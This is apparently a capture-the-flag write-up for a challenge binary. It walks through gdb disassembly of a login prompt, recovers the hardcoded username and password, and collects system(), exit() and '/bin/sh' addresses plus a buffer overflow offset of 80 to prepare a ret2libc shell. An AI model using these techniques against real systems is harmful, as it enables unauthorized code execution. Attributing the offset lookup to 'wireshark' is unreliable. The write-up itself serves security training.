# GDB analysis

[`gdb`](https://linux.die.net/man/1/gdb) is useful for us to understand how a given binary works.

## Main function

Let's see what this program does...

```gdb
  $> gdb ./level01
  (gdb) disassemble main
  Dump of assembler code for function main:
    0x080484d0 <+0>:     push   %ebp
    0x080484d1 <+1>:     mov    %esp,%ebp
    0x080484d3 <+3>:     push   %edi
    0x080484d4 <+4>:     push   %ebx
    0x080484d5 <+5>:     and    $0xfffffff0,%esp
    0x080484d8 <+8>:     sub    $0x60,%esp
    0x080484db <+11>:    lea    0x1c(%esp),%ebx
    0x080484df <+15>:    mov    $0x0,%eax
    0x080484e4 <+20>:    mov    $0x10,%edx
    0x080484e9 <+25>:    mov    %ebx,%edi
    0x080484eb <+27>:    mov    %edx,%ecx
    0x080484ed <+29>:    rep stos %eax,%es:(%edi)
    0x080484ef <+31>:    movl   $0x0,0x5c(%esp)
    0x080484f7 <+39>:    movl   $0x80486b8,(%esp)
    0x080484fe <+46>:    call   0x8048380 <puts@plt>
    0x08048503 <+51>:    mov    $0x80486df,%eax
    0x08048508 <+56>:    mov    %eax,(%esp)
    0x0804850b <+59>:    call   0x8048360 <printf@plt>
    0x08048510 <+64>:    mov    0x804a020,%eax
    0x08048515 <+69>:    mov    %eax,0x8(%esp)
    0x08048519 <+73>:    movl   $0x100,0x4(%esp)
    0x08048521 <+81>:    movl   $0x804a040,(%esp)
    0x08048528 <+88>:    call   0x8048370 <fgets@plt>
    0x0804852d <+93>:    call   0x8048464 <verify_user_name>
    0x08048532 <+98>:    mov    %eax,0x5c(%esp)
    0x08048536 <+102>:   cmpl   $0x0,0x5c(%esp)
    0x0804853b <+107>:   je     0x8048550 <main+128>
    0x0804853d <+109>:   movl   $0x80486f0,(%esp)
    0x08048544 <+116>:   call   0x8048380 <puts@plt>
    0x08048549 <+121>:   mov    $0x1,%eax
    0x0804854e <+126>:   jmp    0x80485af <main+223>
    0x08048550 <+128>:   movl   $0x804870d,(%esp)
    0x08048557 <+135>:   call   0x8048380 <puts@plt>
    0x0804855c <+140>:   mov    0x804a020,%eax
    0x08048561 <+145>:   mov    %eax,0x8(%esp)
    0x08048565 <+149>:   movl   $0x64,0x4(%esp)
    0x0804856d <+157>:   lea    0x1c(%esp),%eax
    0x08048571 <+161>:   mov    %eax,(%esp)
    0x08048574 <+164>:   call   0x8048370 <fgets@plt>
    0x08048579 <+169>:   lea    0x1c(%esp),%eax
    0x0804857d <+173>:   mov    %eax,(%esp)
    0x08048580 <+176>:   call   0x80484a3 <verify_user_pass>
    0x08048585 <+181>:   mov    %eax,0x5c(%esp)
    0x08048589 <+185>:   cmpl   $0x0,0x5c(%esp)
    0x0804858e <+190>:   je     0x8048597 <main+199>
    0x08048590 <+192>:   cmpl   $0x0,0x5c(%esp)
    0x08048595 <+197>:   je     0x80485aa <main+218>
    0x08048597 <+199>:   movl   $0x804871e,(%esp)
    0x0804859e <+206>:   call   0x8048380 <puts@plt>
    0x080485a3 <+211>:   mov    $0x1,%eax
    0x080485a8 <+216>:   jmp    0x80485af <main+223>
    0x080485aa <+218>:   mov    $0x0,%eax
    0x080485af <+223>:   lea    -0x8(%ebp),%esp
    0x080485b2 <+226>:   pop    %ebx
    0x080485b3 <+227>:   pop    %edi
    0x080485b4 <+228>:   pop    %ebp
    0x080485b5 <+229>:   ret 
  End of assembler dump.
```

> It uses [`puts()`](https://man7.org/linux/man-pages/man3/puts.3.html), [`printf()`](https://man7.org/linux/man-pages/man3/printf.3.html) and [`fgets()`](https://linux.die.net/man/3/fgets) and calls for two custom functions: `verify_user_name()` and `verify_user_pass()`.

As we can see, it asks us to input two strings using `fgets()` which seems like a login/password pair.

## Additional functions

As we discovered there are two more functions to go through...

```gdb
  $> gdb ./level01 
  (gdb) disassemble verify_user_name
  Dump of assembler code for function verify_user_name:
   0x08048464 <+0>:     push   %ebp
   0x08048465 <+1>:     mov    %esp,%ebp
   0x08048467 <+3>:     push   %edi
   0x08048468 <+4>:     push   %esi
   0x08048469 <+5>:     sub    $0x10,%esp
   0x0804846c <+8>:     movl   $0x8048690,(%esp)
   0x08048473 <+15>:    call   0x8048380 <puts@plt>
   0x08048478 <+20>:    mov    $0x804a040,%edx
   0x0804847d <+25>:    mov    $0x80486a8,%eax
   0x08048482 <+30>:    mov    $0x7,%ecx
   0x08048487 <+35>:    mov    %edx,%esi
   0x08048489 <+37>:    mov    %eax,%edi
   0x0804848b <+39>:    repz cmpsb %es:(%edi),%ds:(%esi)
   0x0804848d <+41>:    seta   %dl
   0x08048490 <+44>:    setb   %al
   0x08048493 <+47>:    mov    %edx,%ecx
   0x08048495 <+49>:    sub    %al,%cl
   0x08048497 <+51>:    mov    %ecx,%eax
   0x08048499 <+53>:    movsbl %al,%eax
   0x0804849c <+56>:    add    $0x10,%esp
   0x0804849f <+59>:    pop    %esi
   0x080484a0 <+60>:    pop    %edi
   0x080484a1 <+61>:    pop    %ebp
   0x080484a2 <+62>:    ret    
End of assembler dump.
```

> It uses [`puts()`](https://man7.org/linux/man-pages/man3/puts.3.html) and [`strncmp()`](https://linux.die.net/man/3/strncmp) via the `repz cmpsb` instruction.

This one displays a message before comparing our first input to a string (`dat_wil` as shown bellow).

```gdb
  $> gdb ./level01 
  (gdb) disassemble verify_user_pass 
  Dump of assembler code for function verify_user_pass:
    0x080484a3 <+0>:     push   %ebp
    0x080484a4 <+1>:     mov    %esp,%ebp
    0x080484a6 <+3>:     push   %edi
    0x080484a7 <+4>:     push   %esi
    0x080484a8 <+5>:     mov    0x8(%ebp),%eax
    0x080484ab <+8>:     mov    %eax,%edx
    0x080484ad <+10>:    mov    $0x80486b0,%eax
    0x080484b2 <+15>:    mov    $0x5,%ecx
    0x080484b7 <+20>:    mov    %edx,%esi
    0x080484b9 <+22>:    mov    %eax,%edi
    0x080484bb <+24>:    repz cmpsb %es:(%edi),%ds:(%esi)
    0x080484bd <+26>:    seta   %dl
    0x080484c0 <+29>:    setb   %al
    0x080484c3 <+32>:    mov    %edx,%ecx
    0x080484c5 <+34>:    sub    %al,%cl
    0x080484c7 <+36>:    mov    %ecx,%eax
    0x080484c9 <+38>:    movsbl %al,%eax
    0x080484cc <+41>:    pop    %esi
    0x080484cd <+42>:    pop    %edi
    0x080484ce <+43>:    pop    %ebp
    0x080484cf <+44>:    ret    
  End of assembler dump.
```

> It only use [`strncmp()`](https://linux.die.net/man/3/strncmp) via the `repz cmpsb` instruction.

Same process here, comparing our second input to another string (`admin` as shown bellow).

# Data

## Variables

Using gdb, we can get the list of global variable as well.

```gdb
  (gdb) info variable
  All defined variables:

  Non-debugging symbols:
  0x08048688  _fp_hw
  0x0804868c  _IO_stdin_used
  0x08048898  __FRAME_END__
  0x08049f14  __CTOR_LIST__
  0x08049f14  __init_array_end
  0x08049f14  __init_array_start
  0x08049f18  __CTOR_END__
  0x08049f1c  __DTOR_LIST__
  0x08049f20  __DTOR_END__
  0x08049f24  __JCR_END__
  0x08049f24  __JCR_LIST__
  0x08049f28  _DYNAMIC
  0x08049ff4  _GLOBAL_OFFSET_TABLE_
  0x0804a014  __data_start
  0x0804a014  data_start
  0x0804a018  __dso_handle
  0x0804a020  stdin@@GLIBC_2.0
  0x0804a024  completed.6159
  0x0804a028  dtor_idx.6161
  0x0804a040  a_user_name
```

We have a variable called `a_user_name` which is used to hold our first input.

## Addresses

For this level we'll need to do a [ret2libc attack](https://en.wikipedia.org/wiki/Return-to-libc_attack). So we must get addresses of [`system()`](https://man7.org/linux/man-pages/man3/system.3.html), [`exit()`](https://man7.org/linux/man-pages/man3/exit.3.html) and the string `/bin/sh` (located in the next section).

```gdb
  (gdb) print &system
  $1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
```

Address of `system()` function is `0xf7e6aed0`.

```gdb
  (gdb) print &exit
  $1 = (<text variable, no debug info> *) 0xf7e5eb70 <exit>
```

Address of `exit()` function is `0xf7e5eb70`.

```gdb
  (gdb) find &system, +9999999, "/bin/sh"
  0xf7f897ec
```

The string `/bin/sh` is located at `0xf7f897ec`.

## Strings

```
  0x0804847d <+25>:    mov    $0x80486a8,%eax

  (gdb) x/s 0x80486a8
  0x80486a8: "dat_wil"
```

The string `dat_wil` is located at address `0x80486a8`.

```
  0x080484ad <+10>:    mov    $0x80486b0,%eax
  
  (gdb) x/s 0x80486b0
  0x80486b0: "admin"
```

The string `admin` is located at address `0x80486b0`.

## Buffer offsets

Since there is no built-in way to spawn a shell we'll need to use a buffer overflow, for this we need to know its offset. Using a pattern generator like [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) we can quickly now this.

```gdb
  $> gdb level01
  (gdb) run

  Starting program: /home/users/level01/level01 
  ********* ADMIN LOGIN PROMPT *********
  Enter Username: dat_wil
  verifying username....

  Enter Password: 
  Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae
  nope, incorrect password...

  Program received signal SIGSEGV, Segmentation fault.
  0x37634136 in ?? ()
```

> Using this particular pattern ends up with a segfault due to overflow. The program tries to access address `0x37634136` thanks to that overflow. Using `wireshark` we can then, find out that this particular string is in fact at index **80** in the pattern, this is our offset for this buffer.